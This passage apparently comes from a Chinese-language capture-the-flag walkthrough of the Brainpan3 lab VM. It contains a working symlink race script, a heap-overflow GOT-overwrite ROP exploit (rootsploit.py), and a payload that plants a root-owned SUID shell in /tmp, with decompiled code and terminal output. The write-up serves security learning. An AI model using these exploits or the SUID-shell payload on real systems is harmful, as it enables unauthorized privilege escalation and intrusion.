*)&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 0;</span><br><span class="line">      puts(<span class="string">&quot;Incorrect key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Authentication successful&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reynard可以写入“/mnt/usb/”文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">131707    4 drwxrwx---   2 reynard  dev          4096 Aug  2 15:54 /mnt/usb</span><br></pre></td></tr></table></figure>

<p>一旦在7075上连接到服务，就会执行checkKeyfile函数，该函数打开2个密钥文件并比较它们的内容，如果它们匹配，则将其放入shell中。符号链接检查和睡眠（使用select）使Superkojiman暗示了比赛状况。可以在usb文件夹中重复创建一个密钥文件，然后将其更改为指向puck文件夹中的密钥文件的符号链接，同时连接到该服务，并希望在某个时候能克服符号链接检查和打开文件。将欺骗比较两个相同文件的代码，即pucks文件夹中的有效密钥。</p>
<h2 id="走向胜利"><a href="#走向胜利" class="headerlink" title="走向胜利"></a>走向胜利</h2><p>编写了一段python代码，该代码重复创建了一个密钥文件，将其更改为符号链接，并且每次操作之间几乎没有睡眠。该脚本必须作为reynard运行，因为他是唯一允许写入usb文件夹的脚本。任何其他用户都可以连接到该服务。</p>
<p>race.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> os.geteuid() != 1002:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Run as user reynard&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1000)</span><br><span class="line">        os.system(<span class="string">&#x27;echo &quot;h4xh4xh4xh4xh4xh4x&quot; &gt; /mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        os.unlink(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">        os.symlink(<span class="string">&#x27;/home/puck/key.txt&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        os.unlink(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Finished&#x27;</span></span><br></pre></td></tr></table></figure>

<p>为了使其正常工作，需要2个shell，因此使用了报告漏洞利用创建了另一个anansi shell。当reynard shell执行race脚本时，此anansi shell用于连接到服务。race脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python race.py</span><br><span class="line">python race.py</span><br></pre></td></tr></table></figure>

<p>在第二个终端中运行几次netcat循环，直到成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..100&#125;;<span class="keyword">do</span> nc 127.0.0.1 7075;sleep 0.1; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..100&#125;;<span class="keyword">do</span> nc 127.0.0.1 7075;sleep 0.1; <span class="keyword">done</span></span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Authentication successful</span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1004(dev) groups=1001(puck)</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">anansi</span><br><span class="line">puck</span><br><span class="line">reynard</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">key.txt</span><br><span class="line">cat key.txt</span><br><span class="line">cat key.txt</span><br><span class="line">HBN48HY71ERG5GA6290V</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">key.txt</span><br><span class="line">ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 24</span><br><span class="line">drwx------ 2 puck puck 4096 Jun 10  2015 .</span><br><span class="line">drwxr-xr-x 5 root root 4096 May 19  2015 ..</span><br><span class="line">-rw------- 1 puck puck    0 Jun 10  2015 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck puck  220 May 19  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck puck 3637 May 19  2015 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck puck  675 May 19  2015 .profile</span><br><span class="line">-rw------- 1 puck puck   21 May 19  2015 key.txt</span><br></pre></td></tr></table></figure>

<h2 id="没有得到root权限，就没有荣耀"><a href="#没有得到root权限，就没有荣耀" class="headerlink" title="没有得到root权限，就没有荣耀"></a>没有得到root权限，就没有荣耀</h2><p>当搜索有关puck的文件时，已经找到了一个有趣的cron job</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/home/puck$ ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x  2 root root 4.0K May 20  2015 .</span><br><span class="line">drwxr-xr-x 90 root root 4.0K Feb  6 07:11 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder</span><br><span class="line">-rw-r--r--  1 root root  100 May 19  2015 msg_admin</span><br><span class="line">puck@brainpan3:/home/puck$ cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">* * * * * root <span class="built_in">cd</span> /opt/.messenger; <span class="keyword">for</span> i <span class="keyword">in</span> *.msg; <span class="keyword">do</span> /usr/<span class="built_in">local</span>/bin/msg_admin 1 <span class="variable">$i</span>; rm -f <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">puck@brainpan3:/home/puck$ /usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">Usage: /usr/<span class="built_in">local</span>/bin/msg_admin priority message.txt</span><br><span class="line">Message file format: requestername|message</span><br><span class="line">Eg: tony|Add a new user to repo</span><br><span class="line">Can have multiple messages <span class="keyword">in</span> a single file separated by newlines.</span><br><span class="line">Eg: tony|Please remove /tmp/foo</span><br><span class="line">    cate|Reset password request.</span><br></pre></td></tr></table></figure>

<p>cron job 从/opt/.messenger文件夹中获取所有.msg文件，并将它们传递给msg_admin可执行文件，然后删除该文件。将可执行文件复制到本地计算机进行分析。</p>
<p>struct_msg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">struct struct_msg</span><br><span class="line">&#123;</span><br><span class="line">  int Priority;</span><br><span class="line">  char *Requestername;</span><br><span class="line">  char *Msg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void *v3; // esp</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v5; // ebx</span><br><span class="line">  int v6; // ebx</span><br><span class="line">  char *v7; // ebx</span><br><span class="line">  const char *v8; // [esp-18h] [ebp-98h]</span><br><span class="line">  int v9; // [esp-14h] [ebp-94h]</span><br><span class="line">  int v10; // [esp-Ch] [ebp-8Ch]</span><br><span class="line">  const char **v11; // [esp+0h] [ebp-80h]</span><br><span class="line">  int v12; // [esp+4h] [ebp-7Ch]</span><br><span class="line">  char *s; // [esp+Ch] [ebp-74h]</span><br><span class="line">  int v14; // [esp+10h] [ebp-70h]</span><br><span class="line">  int i; // [esp+14h] [ebp-6Ch]</span><br><span class="line">  int v16; // [esp+18h] [ebp-68h]</span><br><span class="line">  int v17; // [esp+1Ch] [ebp-64h]</span><br><span class="line">  int v18; // [esp+20h] [ebp-60h]</span><br><span class="line">  char *dest; // [esp+24h] [ebp-5Ch]</span><br><span class="line">  FILE *stream; // [esp+28h] [ebp-58h]</span><br><span class="line">  void *v21; // [esp+2Ch] [ebp-54h]</span><br><span class="line">  void *v22; // [esp+30h] [ebp-50h]</span><br><span class="line">  char *delim; // [esp+34h] [ebp-4Ch]</span><br><span class="line">  char *src; // [esp+38h] [ebp-48h]</span><br><span class="line">  int v25[10]; // [esp+3Ch] [ebp-44h]</span><br><span class="line">  unsigned int v26; // [esp+64h] [ebp-1Ch]</span><br><span class="line">  int *v27; // [esp+70h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v27 = &amp;argc;</span><br><span class="line">  v12 = argc;</span><br><span class="line">  v11 = argv;</span><br><span class="line">  v26 = __readgsdword(0x14u);</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 10;</span><br><span class="line">  v14 = 0;</span><br><span class="line">  i = 0;</span><br><span class="line">  v18 = 399;</span><br><span class="line">  v3 = alloca(400);</span><br><span class="line">  dest = (char *)&amp;v10;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v11[1];</span><br><span class="line">    v16 = atol(v8);</span><br><span class="line">    stream = fopen(v11[2], <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    s = (char *)malloc(0x190u);</span><br><span class="line">    v21 = malloc(0x14u);</span><br><span class="line">    v22 = malloc(0x64u);</span><br><span class="line">    <span class="keyword">while</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 0 )</span><br><span class="line">      ++v14;</span><br><span class="line">    v9 = v14;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Recording %d entries\n&quot;</span>, v14);</span><br><span class="line">    rewind(stream);</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v25[i] = (int)malloc(0xCu);</span><br><span class="line">      *(_DWORD *)v25[i] = v16;</span><br><span class="line">      v5 = v25[i];</span><br><span class="line">      *(_DWORD *)(v5 + 4) = malloc(0xAu);</span><br><span class="line">      v6 = v25[i];</span><br><span class="line">      *(_DWORD *)(v6 + 8) = malloc(0xC8u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      delim = <span class="string">&quot;|&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = s;</span><br><span class="line">        v7[strlen(s) - 1] = 0;</span><br><span class="line">        src = strtok(s, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 4), src);</span><br><span class="line">        src = strtok(0, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 8), src);</span><br><span class="line">        strncpy(dest, *(const char **)(v25[i] + 8), 0x64u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    notify_admin((int)v25, v14);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    usage((int)*v11);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是经典的内存损坏。对于.msg文件中的每条消息（行），它都会创建一个struct_msg结构并为其变量分配内存，然后将其添加到列表中。接下来，它循环遍历文件，并在“ |”定界符上分割每一行，并将每个部分复制到结构变量“Requestername”和“Msg”。这些变量的固定大小为10（请求者名称）和200（消息）。由于没有检查长度，因此可能破坏内存中的结构指针。以下代码创建一个包含2条消息的.msg文件，每个文件的变量都填充到其最大值，因此不会破坏任何内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line">payload =  10  * <span class="string">&#x27;\x41&#x27;</span> <span class="comment"># A</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span> <span class="comment"># B</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 10  * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># C</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span> <span class="comment"># D</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>当使用GDB分析内存时，可以看到如何映射所有内存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x00000000    0x00000011</span><br><span class="line">0x804c478:    0x00000001    0x0804c488    0x0804c498    0x00000011</span><br><span class="line">0x804c488:    0x43434343    0x43434343    0x00004343    0x000000d1</span><br><span class="line">0x804c498:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4a8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4b8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4c8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4d8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4e8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4f8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c508:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c518:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c528:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c538:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c548:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c558:    0x44444444    0x44444444    0x00000000    0x00020aa1</span><br></pre></td></tr></table></figure>

<p>第一个struct_msg结构位于0x804c388，第二个位于0x804c478。现在，在第一个消息中使用较大的（216字节）“Msg”缓冲区时，将覆盖第二个struct_msg结构的“Requestername”指针，并在下一个strcpy调用中有效控制目标指针和源数据，从而导致Write-允许我们修补GOT条目的任何条件。这段代码将got.strtok地址修补为0x43434343，strtok是strcpy之后执行的下一个函数。我编写了一个ROP有效负载，它通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/ tmp / foo’调用eax（system），这是一个脚本由我们创建并在执行时将根拥有的SUID shell复制到tmp。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line"><span class="comment"># .got.plt:0804B05C off_804B05C     dd offset strtok        ; DATA XREF: _strtok</span></span><br><span class="line">payload = 10 * <span class="string">&#x27;\x41&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line">payload += 12 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line"><span class="comment"># overwrite 2nd struct it&#x27;s requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes 0x43434343</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 4 * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>一些GDB</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/150xw 0x804c388</span><br><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c478:    0x42424242    0x0804b05c    0x0804c400    0x00000011</span><br><span class="line">0x804c488:    0x00000000    0x00000000    0x00000000    0x000000d1</span><br><span class="line">0x804c498:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4a8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4b8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4c8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4d8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4e8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4f8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c508:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c518:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c528:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c538:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c548:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c558:    0x00000000    0x00000000    0x00000000    0x00020aa1</span><br><span class="line">...</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x43434343</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff2ac --&gt; 0x8048ce3 (:    mov    DWORD PTR [ebp-0x48],eax)</span><br><span class="line">0004| 0xbffff2b0 --&gt; 0x0 </span><br><span class="line">0008| 0xbffff2b4 --&gt; 0x8048f4d --&gt; 0x100007c </span><br><span class="line">0012| 0xbffff2b8 --&gt; 0x804c008 --&gt; 0xfbad2488 </span><br><span class="line">0016| 0xbffff2bc (<span class="string">&#x27;B&#x27;</span> repeats 100 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0020| 0xbffff2c0 (<span class="string">&#x27;B&#x27;</span> repeats 96 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0024| 0xbffff2c4 (<span class="string">&#x27;B&#x27;</span> repeats 92 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0028| 0xbffff2c8 (<span class="string">&#x27;B&#x27;</span> repeats 88 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x43434343 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>基于GDB的输出，可以看到，如果执行pop（4）小工具，将返回第一条（上一条）消息的“目标”数据，该消息由“strncpy（dest，aMessages [i]”存储在堆栈中]-&gt; Msg，100u）;’。</p>
<h4 id="root所有的一切"><a href="#root所有的一切" class="headerlink" title="root所有的一切"></a>root所有的一切</h4><p>编写了一个ROP payload，通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/tmp/foo’调用eax（system），这是一个脚本由我创建并在执行时将root拥有的SUID shell复制到tmp。</p>
<p>rootsploit.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">__strtok_got    = 0x0804B05C</span><br><span class="line">__atol_got      = 0x0804B04C</span><br><span class="line">__ppppr         = 0x08048DDC</span><br><span class="line">__foo_str       = 0x08048ED8</span><br><span class="line">__int16_e800h   = 0x080480C7</span><br><span class="line">__int16_0100h   = 0x08048093</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">rop  = p(0x08048790)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__atol_got - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_e800h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_0100h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048786)</span><br><span class="line">rop += p(__foo_str + 23)</span><br><span class="line"> </span><br><span class="line">payload = 10 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += rop.ljust(212, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># padding till 212 eq next struct requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes __ppppr</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">payload += p(__ppppr) <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;exploit.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br><span class="line">foocode = <span class="string">&quot;cp /bin/sh /tmp/r00tsh3ll;chown root:root /tmp/r00tsh3ll;chmod 4755 /tmp/r00tsh3ll&quot;</span></span><br><span class="line">open(<span class="string">&#x27;/tmp/foo&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(foocode)</span><br><span class="line">os.system(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>从tmp文件夹执行漏洞利用脚本，并将创建的exploit.msg移至/opt/.messenger文件夹，然后稍等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/tmp$ python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 20K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rw-r--r--  1 puck   dev     434 Feb  6 13:03 exploit.msg</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1004(dev) 